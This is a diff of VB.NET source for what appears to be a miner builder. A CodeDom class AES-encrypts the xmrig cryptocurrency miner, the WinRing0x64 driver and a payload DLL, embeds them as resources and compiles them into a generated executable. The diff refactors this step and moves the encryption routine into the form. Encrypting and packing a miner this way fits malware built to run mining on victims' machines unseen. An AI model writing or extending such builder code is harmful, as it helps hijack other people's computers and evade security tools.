@@ -31,19 +31,19 @@ Public Class Codedom
             .ReferencedAssemblies.Add("System.IO.Compression.dll")
             .ReferencedAssemblies.Add("System.IO.Compression.FileSystem.dll")
 
-            F.txtLog.Text = F.txtLog.Text + ("Creating a DLL..." + vbNewLine)
+            F.txtLog.Text = F.txtLog.Text + ("Creating resources..." + vbNewLine)
 
             Using R As New Resources.ResourceWriter(IO.Path.GetTempPath & "\" + Res + ".Resources")
-                R.AddResource(F.Resources_dll, AES_Encryptor(My.Resources.Project1))
-                R.AddResource(F.Resources_xmrig, AES_Encryptor(My.Resources.xmrig))
-                R.AddResource(F.Resources_winring, AES_Encryptor(My.Resources.WinRing0x64))
+                R.AddResource(F.Resources_dll, F.AES_Encryptor(My.Resources.Project1))
+                R.AddResource(F.Resources_xmrig, F.AES_Encryptor(My.Resources.xmrig))
+                R.AddResource(F.Resources_winring, F.AES_Encryptor(My.Resources.WinRing0x64))
                 If (F.toggleEnableGPU.Checked) Then
-                    R.AddResource(F.Resources_libs, AES_Encryptor(My.Resources.libs))
+                    R.AddResource(F.Resources_libs, F.AES_Encryptor(My.Resources.libs))
                 End If
                 R.Generate()
             End Using
 
-            F.txtLog.Text = F.txtLog.Text + ("Embedded Resource..." + vbNewLine)
+            F.txtLog.Text = F.txtLog.Text + ("Embedding resources..." + vbNewLine)
             .EmbeddedResources.Add(IO.Path.GetTempPath & "\" + F.Resources_Parent + ".Resources")
 
             Dim Results = CodeProvider.CompileAssemblyFromSource(Parameters, Code)
@@ -61,19 +61,4 @@ Public Class Codedom
         End With
 
     End Sub
-
-    Public Shared Function AES_Encryptor(ByVal input As Byte()) As Byte()
-        Dim AES As New RijndaelManaged
-        Dim Hash As New MD5CryptoServiceProvider
-        Try
-            AES.Key = Hash.ComputeHash(System.Text.Encoding.Default.GetBytes(F.AESKEY))
-            AES.Mode = CipherMode.ECB
-            Dim DESEncrypter As ICryptoTransform = AES.CreateEncryptor
-            Dim Buffer As Byte() = input
-            Return DESEncrypter.TransformFinalBlock(Buffer, 0, Buffer.Length)
-        Catch ex As Exception
-        End Try
-    End Function
-
-
 End Class
